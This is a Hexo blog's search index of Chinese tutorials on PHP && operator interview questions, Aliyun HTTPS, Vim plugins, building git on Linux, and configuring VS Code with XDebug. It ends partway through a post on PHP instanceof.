<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[运算符 && 的面试及分析]]></title>
      <url>/2019/04/13/%E8%BF%90%E7%AE%97%E7%AC%A6-%E7%9A%84%E9%9D%A2%E8%AF%95%E5%8F%8A%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote>
<p>知识点：&amp;&amp;<br>1：当左边为真时，右边则执行<br>2：当左为假时，右边则不执行<br>3：当2个条件都为真时，才会进入if体内</p>
</blockquote>
<h4 id="一、加括号"><a href="#一、加括号" class="headerlink" title="一、加括号"></a>一、加括号</h4><h5 id="1、两个条件都为真时"><a href="#1、两个条件都为真时" class="headerlink" title="1、两个条件都为真时"></a>1、两个条件都为真时</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a = 3;</div><div class="line">$b = 4;</div><div class="line"></div><div class="line">if(($a=5) &amp;&amp; ($b=6))&#123;</div><div class="line">    $a+=1;</div><div class="line">    $b+=1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">echo $a;</div><div class="line">echo &apos;&lt;br&gt;&apos;;</div><div class="line">echo $b;</div></pre></td></tr></table></figure>
<blockquote>
<p>结果：6  7</p>
</blockquote>
<p>解析：<br>1：( )的运算符大于 &amp;&amp; ，优先运算( )<br>2：if判断<br>3：($a=5) 为 true, $a的值被重新赋值为 5<br>4：($b=6) 为 true, $b的值被重新赋值为 6<br>5：进入 if 体内（注意：当2个条件为真时才会进入if体内)</p>
<h5 id="2、左边为真，右边为假"><a href="#2、左边为真，右边为假" class="headerlink" title="2、左边为真，右边为假"></a>2、左边为真，右边为假</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a = 3;</div><div class="line">$b = 4;</div><div class="line"></div><div class="line">if(($a=5) &amp;&amp; ($b=0))&#123;</div><div class="line">    $a+=1;</div><div class="line">    $b+=1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">echo $a;</div><div class="line">echo &apos;&lt;br&gt;&apos;;</div><div class="line">echo $b;</div></pre></td></tr></table></figure>
<blockquote>
<p>结果：5  0 </p>
</blockquote>
<p>解析：<br>1：( )的运算符大于 &amp;&amp; ，优先运算( )<br>2：if判断<br>3：($a=5) 为 true, $a的值被重新赋值为 5<br>4：($b=6) 为 false, $b的值被重新赋值为 0<br>5：&amp;&amp; 运算不成立，不会进入if体内</p>
<h5 id="3、左边为假，右边为真"><a href="#3、左边为假，右边为真" class="headerlink" title="3、左边为假，右边为真"></a>3、左边为假，右边为真</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a = 3;</div><div class="line">$b = 4;</div><div class="line"></div><div class="line">if(($a=0) &amp;&amp; ($b=6))&#123;</div><div class="line">    $a+=1;</div><div class="line">    $b+=1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">echo $a;</div><div class="line">echo &apos;&lt;br&gt;&apos;;</div><div class="line">echo $b;</div></pre></td></tr></table></figure>
<blockquote>
<p>结果：0 4</p>
</blockquote>
<p>解析：<br>1：($a=0) 为false，后面($b=6)不会被执行，更加不会进入if 体内</p>
<h4 id="二、不加括号"><a href="#二、不加括号" class="headerlink" title="二、不加括号"></a>二、不加括号</h4><h5 id="1、两个条件都为真"><a href="#1、两个条件都为真" class="headerlink" title="1、两个条件都为真"></a>1、两个条件都为真</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a = 3;</div><div class="line">$b = 4;</div><div class="line"></div><div class="line">if($a=5 &amp;&amp; $b=6)&#123;</div><div class="line">    $a+=1;</div><div class="line">    $b+=1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">echo $a;</div><div class="line">echo &apos;&lt;br&gt;&apos;;</div><div class="line">echo $b;</div></pre></td></tr></table></figure>
<blockquote>
<p>结果： 2 7</p>
</blockquote>
<p>解析：<br>1：&amp;&amp; 优先级大于 赋值运算符优先级要高<br>2：得到：==$a=(5 &amp;&amp; $b=6)==<br>3：按第一点所说将会发生这种情况 ==$a=((5 &amp;&amp; $b)=6)==,这样的话就很不合理,所以php会提高$b=6运算优先级，最后得到：==$a=(5 &amp;&amp; (b=6))== 简化一下就是：==$a=(5 &amp;&amp; 6)==<br>4： ==(5 &amp;&amp; 6)== 为true, 将true赋值给$a ($a=true),注：1为 true， 0为 false<br>5: 进入if体内并，最后得到的结果为 2 7</p>
<blockquote>
<p>参考视频： <a href="http://www.yzmedu.com/learn/361" target="_blank" rel="external">http://www.yzmedu.com/learn/361</a>  （第8集28分钟左右）</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a = 3;</div><div class="line">$b = 4;</div><div class="line"></div><div class="line">if($a &amp;&amp; $b=6)&#123;</div><div class="line">    $a+=1;</div><div class="line">    $b+=1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">echo $a;</div><div class="line">echo &apos;&lt;br&gt;&apos;;</div><div class="line">echo $b;</div></pre></td></tr></table></figure>
<blockquote>
<p>结果：4 7</p>
</blockquote>
<p>解析：<br>1：&amp;&amp; 优先级大于 赋值运算符优先级要高<br>2：得到：==($a &amp;&amp; $b)== ，简化后：==(3 &amp;&amp; 6)==<br>3: 进入if体内并，最后得到的结果为 4 7</p>
<h5 id="2、左为假，右为真"><a href="#2、左为假，右为真" class="headerlink" title="2、左为假，右为真"></a>2、左为假，右为真</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a = 3;</div><div class="line">$b = 4;</div><div class="line"></div><div class="line">if($a=0 &amp;&amp; $b=6)&#123;</div><div class="line">    $a+=1;</div><div class="line">    $b+=1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var_dump( $a);</div><div class="line">echo &apos;&lt;br&gt;&apos;;</div><div class="line">echo $b;</div></pre></td></tr></table></figure>
<blockquote>
<p>结果：false 4</p>
</blockquote>
<h5 id="3、左为真，右为假"><a href="#3、左为真，右为假" class="headerlink" title="3、左为真，右为假"></a>3、左为真，右为假</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a = 3;</div><div class="line">$b = 4;</div><div class="line"></div><div class="line">if($a &amp;&amp; $b=0)&#123;</div><div class="line">    $a+=1;</div><div class="line">    $b+=1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">echo$a;</div><div class="line">echo &apos;&lt;br&gt;&apos;;</div><div class="line">echo $b;</div></pre></td></tr></table></figure>
<blockquote>
<p>结果：3 0</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 面试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php </tag>
            
            <tag> 面试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[阿里云 https 配置 (免费)]]></title>
      <url>/2019/04/13/%E9%98%BF%E9%87%8C%E4%BA%91-https-%E9%85%8D%E7%BD%AE(%E5%85%8D%E8%B4%B9)/</url>
      <content type="html"><![CDATA[<p>参考地址：<br>1：<a href="https://www.cnblogs.com/SemiconductorKING/p/9106971.html" target="_blank" rel="external">https://www.cnblogs.com/SemiconductorKING/p/9106971.html</a><br>2：<a href="https://blog.csdn.net/weixin_39920296/article/details/81084746（基本能解决问题）" target="_blank" rel="external">https://blog.csdn.net/weixin_39920296/article/details/81084746（基本能解决问题）</a><br>3：<a href="https://help.aliyun.com/document_detail/63736.html?spm=a2c4g.11186623.6.564.7d663e5flVnUVR" target="_blank" rel="external">HTTPS配置-推荐</a></p>
<p>一、购买免费证书<br><a href="https://common-buy.aliyun.com/?spm=5176.2020520154.cas.1.738byojZyojZAq&amp;commodityCode=cas#/buy" target="_blank" rel="external">阿里云购买地址 </a>选择免费，购买完成会直接跳转至SSL证书管理页面，如下图点击申请</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> https </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux 下vim配置+插件安装]]></title>
      <url>/2019/04/09/linux-%E4%B8%8Bvim%E9%85%8D%E7%BD%AE-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85/</url>
      <content type="html"><![CDATA[<p>vim插件大全：<br>1：<a href="https://zhuanlan.zhihu.com/p/24742679" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/24742679</a><br>2：<a href="https://vimawesome.com/" target="_blank" rel="external">https://vimawesome.com/</a></p>
<p>Vim 插件的安装 ：<br>1：<a href="https://blog.csdn.net/freeking101/article/details/78539750" target="_blank" rel="external">https://blog.csdn.net/freeking101/article/details/78539750</a></p>
<h3 id="一、Vundle-简述"><a href="#一、Vundle-简述" class="headerlink" title="一、Vundle 简述"></a>一、Vundle 简述</h3><p>一旦你用Vundle设置好了插件，就可以使用几个Vundle命令，用Vundle来安装、更新、搜索和清理闲置未用的插件。<br>搜索插件：如果你想从所提供的插件列表安装一个插件，搜索功能就很有用。:PluginSearch <text-list> 在搜索过程中，你可以在交互式分屏上安装、清理、研究或重新装入同一列表。安装插件不会自动装入你的插件。想自动装入插件，将插件添加到你的.vimrc文件</text-list></p>
<h3 id="二、Vundle常用命令"><a href="#二、Vundle常用命令" class="headerlink" title="二、Vundle常用命令"></a>二、Vundle常用命令</h3><p>注：先打开一个vim，在配合这些命令使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">:PlugInstall                         		命令会安装在你的.vimrc文件中列出来的所有插件。</div><div class="line">:PluginInstall &lt;plugin-name&gt;        	还可以只安装某一个特定的插件，只要传递其名称。</div><div class="line">:PluginInstall &lt;vmark.vim--Visual-Bookmarking&gt;</div><div class="line"></div><div class="line">常用的命令（新）</div><div class="line"> :PluginList      		 - 列出所有已配置的插件</div><div class="line"> :PluginInstall     	 - 安装插件,追加 `!` 用以更新或使用 :PluginUpdate</div><div class="line"> :PluginSearch foo	 - 搜索 foo ; 追加 `!` 清除本地缓存</div><div class="line"> :PluginClean    	 - 清除未使用插件,需要确认; 追加 `!` 自动批准移除未使用插件</div></pre></td></tr></table></figure></p>
<p>常用的命令（旧）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">:BundleList            	 -列举列表(也就是.vimrc)中配置的所有插件  </div><div class="line">:BundleInstall            -安装列表中的全部插件  </div><div class="line">:BundleInstall!         	 -更新列表中的全部插件  </div><div class="line">:BundleSearch foo    -查找foo插件  </div><div class="line">:BundleSearch! foo   -刷新foo插件缓存  </div><div class="line">:BundleClean            -清除列表中没有的插件  </div><div class="line">:BundleClean!           -清除列表中没有的插件</div></pre></td></tr></table></figure></p>
<h3 id="三、安装插件"><a href="#三、安装插件" class="headerlink" title="三、安装插件"></a>三、安装插件</h3><h4 id="参考网址："><a href="#参考网址：" class="headerlink" title="参考网址："></a>参考网址：</h4><blockquote>
<p>1：<a href="https://blog.csdn.net/freeking101/article/details/78539750" target="_blank" rel="external">https://blog.csdn.net/freeking101/article/details/78539750</a><br>2：<a href="https://blog.csdn.net/u011417820/article/details/79648429" target="_blank" rel="external">https://blog.csdn.net/u011417820/article/details/79648429</a><br>3：<a href="https://blog.csdn.net/qq_28485501/article/details/85767132" target="_blank" rel="external">https://blog.csdn.net/qq_28485501/article/details/85767132</a></p>
</blockquote>
<h4 id="安装插件有2种方式"><a href="#安装插件有2种方式" class="headerlink" title="安装插件有2种方式"></a>安装插件有2种方式</h4><p>1：打开vim，运行:BundleInstall | :PlugInstall<br>2：shell中直接运行vim +BundleInstall +qall</p>
<p>.vimrc”文件配置好后，打开vim，在命令模式输入插件安装命令 :PluginInstall命令，vim就会自动安装“.vimrc”中配置的所有插件，直到vim底部出现“Done”安装完成。</p>
<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><p>1：配置 .vimrc 文件</p>
<p>2：打开vim在命令行模式中运行：:PluginInstall</p>
<p>3：下载完成之后，需要手动编译后才能使用</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> vim </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux git升级安装以及报错问题解决方法]]></title>
      <url>/2019/04/09/linux-git%E5%8D%87%E7%BA%A7%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p>一、先安装编译时依赖的包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel gcc perl-ExtUtils-MakeMaker</div></pre></td></tr></table></figure></p>
<p>二、卸载旧版本</p>
<blockquote>
<p>yum remove git</p>
</blockquote>
<p>三、下载与安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1 cd ~</div><div class="line">2 wget https://www.kernel.org/pub/software/scm/git/git-2.15.1.tar.xz</div><div class="line">3 tar -vxf git-2.15.1.tar.xz</div><div class="line">4 cd git-2.15.1</div><div class="line">5 make prefix=/usr/local/git all</div><div class="line">6 make prefix=/usr/local/git install</div><div class="line">7 echo &quot;export PATH=$PATH:/usr/local/git/bin&quot; &gt;&gt; /etc/profile</div><div class="line">8 source /etc/profile</div><div class="line">9 git --version</div></pre></td></tr></table></figure></p>
<h3 id="make-编译的时候出现了错误"><a href="#make-编译的时候出现了错误" class="headerlink" title="make 编译的时候出现了错误"></a>make 编译的时候出现了错误</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> LINK git-credential-store</div><div class="line">libgit.a(utf8.o): In function `reencode_string_iconv&apos;:</div><div class="line">/usr/src/git-2.8.3/utf8.c:463: undefined reference to `libiconv&apos;</div><div class="line">libgit.a(utf8.o): In function `reencode_string_len&apos;:</div><div class="line">/usr/src/git-2.8.3/utf8.c:502: undefined reference to `libiconv_open&apos;</div><div class="line">/usr/src/git-2.8.3/utf8.c:521: undefined reference to `libiconv_close&apos;</div><div class="line">/usr/src/git-2.8.3/utf8.c:515: undefined reference to `libiconv_open&apos;</div><div class="line">collect2: ld returned 1 exit status</div><div class="line">make: *** [git-credential-store] Error 1</div></pre></td></tr></table></figure>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>一、安装libiconv<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1 wget http://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.14.tar.gz</div><div class="line">2 tar -zxvf libiconv-1.14.tar.gz</div><div class="line">3 cd libiconv-1.14</div><div class="line">4 ./configure --prefix=/usr/local/libiconv  &amp;&amp;  make  &amp;&amp; make install</div></pre></td></tr></table></figure></p>
<p>二、创建一个软链接到/usr/lib<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ln -s /usr/local/lib/libiconv.so /usr/lib</div><div class="line">ln -s /usr/local/lib/libiconv.so.2 /usr/lib</div></pre></td></tr></table></figure></p>
<p>三、回到git目录继续编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1 cd ~/git-2.15.1(我放在家目录)</div><div class="line">2 make configure</div><div class="line">3 ./configure --prefix=/usr/local --with-iconv=/usr/local/libiconv</div><div class="line">4 make</div><div class="line">5 make install</div></pre></td></tr></table></figure></p>
<p>四、编辑环境变量配置（给到所有用户）: vim /etc/profile<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1 export PATH=$PATH:/usr/local/git/bin  或者 echo &quot;export PATH=$PATH:/usr/local/git/bin&quot; &gt;&gt; /etc/bashrc (需要退出 root 用户再操作. 否则就只有root用户内部才生效了)  </div><div class="line">2 刷新配置：source /etc/bashrc</div></pre></td></tr></table></figure></p>
<p>五、查看GIT版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git --version  </div><div class="line">git version 2.15.1</div></pre></td></tr></table></figure></p>
<h3 id="参考网址"><a href="#参考网址" class="headerlink" title="参考网址"></a>参考网址</h3><blockquote>
<p>1:<a href="https://www.jianshu.com/p/512d25c9df10" target="_blank" rel="external">https://www.jianshu.com/p/512d25c9df10</a><br>2:<a href="https://blog.csdn.net/liuchenxia8/article/details/79652847" target="_blank" rel="external">https://blog.csdn.net/liuchenxia8/article/details/79652847</a><br>3:<a href="https://blog.csdn.net/qq_28903377/article/details/86148687" target="_blank" rel="external">https://blog.csdn.net/qq_28903377/article/details/86148687</a><br>4:<a href="https://blog.csdn.net/daojibruce/article/details/75315401" target="_blank" rel="external">https://blog.csdn.net/daojibruce/article/details/75315401</a><br>5:<a href="https://www.cnblogs.com/gxldan/p/4069956.html" target="_blank" rel="external">https://www.cnblogs.com/gxldan/p/4069956.html</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[vsCode - PHP IntelliSense插件函数跳转]]></title>
      <url>/2019/03/25/vsCode-PHP-IntelliSense%E6%8F%92%E4%BB%B6%E5%87%BD%E6%95%B0%E8%B7%B3%E8%BD%AC/</url>
      <content type="html"><![CDATA[<h3 id="一、安装-PHP-IntelliSense插件"><a href="#一、安装-PHP-IntelliSense插件" class="headerlink" title="一、安装  PHP IntelliSense插件"></a>一、安装  PHP IntelliSense插件</h3><p> 打开vsode 编辑器，ctrl+shift+x 打开扩展商店，搜索 PHP IntelliSense 安装插件<br> <img src="http://imgcdn.95dcw.com/PHP%20IntelliSense-1.png" alt="image"></p>
<h3 id="二、配置-PHP-IntelliSense插件，php-executablePath-路径（按自身情况填写）"><a href="#二、配置-PHP-IntelliSense插件，php-executablePath-路径（按自身情况填写）" class="headerlink" title="二、配置 PHP IntelliSense插件，php.executablePath 路径（按自身情况填写）"></a>二、配置 PHP IntelliSense插件，php.executablePath 路径（按自身情况填写）</h3><p> <img src="http://imgcdn.95dcw.com/PHP%20IntelliSense-2.png" alt="image"></p>
<blockquote>
<p>OK，配置好了后重新vsCode 编辑器，试试效果吧，如果可以正常跳转那么恭喜你，如果还是无法跳转请看最后一步。</p>
</blockquote>
<h3 id="三、最后一步"><a href="#三、最后一步" class="headerlink" title="三、最后一步"></a>三、最后一步</h3><blockquote>
<p>我踩过的坑：明明自己都配置好了 php.executablePath的路径也没错，可为什么还是无法实现函数跳转？</p>
</blockquote>
<font color="#FF0000" face="黑体">那么你还差最后一步，“文件 -&gt; 将工作区另存为”</font>

<p><img src="http://imgcdn.95dcw.com/PHP%20IntelliSense-3.png" alt="image" title="无标题工作区"></p>
<p><img src="http://imgcdn.95dcw.com/PHP%20IntelliSense-4.png" alt="image" title="项目工作区"></p>
]]></content>
      
        <categories>
            
            <category> php </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php </tag>
            
            <tag> vsCode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP+XDebug断点调试（vsCode编辑器）]]></title>
      <url>/2019/03/24/PHP-XDebug%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%EF%BC%88vsCode%E7%BC%96%E8%BE%91%E5%99%A8%EF%BC%89/</url>
      <content type="html"><![CDATA[<hr>
<p>参考网址：<br>1：<a href="https://www.jb51.net/softjc/606841.html" target="_blank" rel="external">https://www.jb51.net/softjc/606841.html</a><br>2：<a href="https://www.cnblogs.com/zjfblog/p/7055100.html" target="_blank" rel="external">https://www.cnblogs.com/zjfblog/p/7055100.html</a><br>3：<a href="https://www.cnblogs.com/CLR010/p/5276077.html" target="_blank" rel="external">https://www.cnblogs.com/CLR010/p/5276077.html</a></p>
<hr>
<h3 id="一、安装-vs-Code（我安装的是最新版1-32-3）"><a href="#一、安装-vs-Code（我安装的是最新版1-32-3）" class="headerlink" title="一、安装 vs Code（我安装的是最新版1.32.3）"></a>一、安装 vs Code（我安装的是最新版1.32.3）</h3><p>在商店搜索如下三个插件并安装好：<br>PHP Debug 、PHP Exteension Pack 、PHP IntelliSense<br><img src="http://imgcdn.95dcw.com/php+xdebug-1.png" alt="image"></p>
<h3 id="二、在vs-Code-中配置PHP的路径"><a href="#二、在vs-Code-中配置PHP的路径" class="headerlink" title="二、在vs Code 中配置PHP的路径"></a>二、在vs Code 中配置PHP的路径</h3><blockquote>
<p>说明：我的是1.32.3版本会有点不一样，如不一样请自行百度，如下是我的操作步骤。</p>
</blockquote>
<h4 id="1：文件-—-gt-首选项-—-gt-设置"><a href="#1：文件-—-gt-首选项-—-gt-设置" class="headerlink" title="1：文件 —&gt; 首选项 —&gt; 设置"></a>1：文件 —&gt; 首选项 —&gt; 设置</h4><h4 id="2：搜索-settings-json-可对其进行配置-如下图"><a href="#2：搜索-settings-json-可对其进行配置-如下图" class="headerlink" title="2：搜索 settings.json 可对其进行配置(如下图)"></a>2：搜索 settings.json 可对其进行配置(如下图)</h4><p><img src="http://imgcdn.95dcw.com/php+xdebug-2.png" alt="image"></p>
<h4 id="3：在seetings-json中配置php-executablePath路径-请根据自己情况填写"><a href="#3：在seetings-json中配置php-executablePath路径-请根据自己情况填写" class="headerlink" title="3：在seetings.json中配置php.executablePath路径(请根据自己情况填写)"></a>3：在seetings.json中配置php.executablePath路径(请根据自己情况填写)</h4><p><img src="http://imgcdn.95dcw.com/php+xdebug-3.png" alt="image"></p>
<h3 id="三、开始调试："><a href="#三、开始调试：" class="headerlink" title="三、开始调试："></a>三、开始调试：</h3><p>1：先 F9 打好断点<br>2：F5 开始调试<br>3：打浏览器输入要调试文件的url （如下是我的效果图）<br><img src="http://imgcdn.95dcw.com/php+xdebug-4.png" alt="image"></p>
]]></content>
      
        <categories>
            
            <category> php </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php </tag>
            
            <tag> xdebug </tag>
            
            <tag> vsCode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XDebug安装]]></title>
      <url>/2019/03/24/XDebug%E5%AE%89%E8%A3%85/</url>
      <content type="html"><![CDATA[<hr>
<p>参考网址：<br>1：<a href="https://www.cnblogs.com/zjfblog/p/7055100.html" target="_blank" rel="external">https://www.cnblogs.com/zjfblog/p/7055100.html</a><br>2：<a href="https://baijiahao.baidu.com/s?id=1607680791440431678&amp;wfr=spider&amp;for=pc" target="_blank" rel="external">https://baijiahao.baidu.com/s?id=1607680791440431678&amp;wfr=spider&amp;for=pc</a><br>3：<a href="https://blog.csdn.net/qq_35770969/article/details/80757959" target="_blank" rel="external">https://blog.csdn.net/qq_35770969/article/details/80757959</a><br>4：<a href="https://xdebug.org/wizard.php" target="_blank" rel="external">https://xdebug.org/wizard.php</a> (php版本检测）</p>
<hr>
<h4 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h4><p>先看完参考网址资料，具体安装可以按第四个参考网址来操作都有详细的步骤，这里不做过多的描述和讲解。</p>
<h4 id="二、我踩过的坑"><a href="#二、我踩过的坑" class="headerlink" title="二、我踩过的坑"></a>二、我踩过的坑</h4><h5 id="1：注意版本号，32位还是64位（在phpinfo中有-如下图"><a href="#1：注意版本号，32位还是64位（在phpinfo中有-如下图" class="headerlink" title="1：注意版本号，32位还是64位（在phpinfo中有)如下图"></a>1：注意版本号，32位还是64位（在phpinfo中有)如下图</h5><p><img src="http://imgcdn.95dcw.com/php_xdebug-1.jpg" alt="image"></p>
<h5 id="2：确保自己开启了-xdebug-扩展（如同-php-gd2、php-curl、php-pdo-这种"><a href="#2：确保自己开启了-xdebug-扩展（如同-php-gd2、php-curl、php-pdo-这种" class="headerlink" title="2：确保自己开启了 xdebug 扩展（如同 php_gd2、php_curl、php_pdo 这种)"></a>2：确保自己开启了 xdebug 扩展（如同 php_gd2、php_curl、php_pdo 这种)</h5><h5 id="3：下载好的php-xdebug文件名，在配置php-ini中一定要一至（我是单独下载的导致文件名有些不同）"><a href="#3：下载好的php-xdebug文件名，在配置php-ini中一定要一至（我是单独下载的导致文件名有些不同）" class="headerlink" title="3：下载好的php_xdebug文件名，在配置php.ini中一定要一至（我是单独下载的导致文件名有些不同）"></a>3：下载好的php_xdebug文件名，在配置php.ini中一定要一至（我是单独下载的导致文件名有些不同）</h5><p><img src="http://imgcdn.95dcw.com/php_xdebug-2.jpg" alt="image"></p>
<h4 id="三、配置-php-ini"><a href="#三、配置-php-ini" class="headerlink" title="三、配置 php.ini"></a>三、配置 php.ini</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[XDebug]</div><div class="line">xdebug.profiler_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;</div><div class="line">xdebug.trace_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;</div><div class="line">zend_extension=&quot;D:\phpStudy\PHPTutorial\php\php-7.0.12-nts\ext\php_xdebug-2.7.0-7.0-vc14-nts.dll&quot;</div><div class="line"></div><div class="line">;是否开启远程调试</div><div class="line">xdebug.remote_enable=1</div><div class="line">xdebug.remote_autostart = 1</div><div class="line"></div><div class="line">;调试插件dbgp</div><div class="line">xdebug.remote_handler=dbgp</div><div class="line">xdebug.remote_mode=req</div><div class="line">;允许调试的客户端IP</div><div class="line">xdebug.remote_host=localhost</div><div class="line">;远程调试的端口（默认9000）</div><div class="line">xdebug.remote_port=9000</div><div class="line">xdebug.idekey=&quot;PHPSTORM&quot;</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> php </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php </tag>
            
            <tag> xdebug </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php 中instanceof的使用]]></title>
      <url>/2019/03/19/php-%E4%B8%ADinstanceof%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<blockquote>
<p>作用： （1）判断一个对象是否是某个类的实例 （2）判断一个对象是否实现了某个接口。</p>
</blockquote>
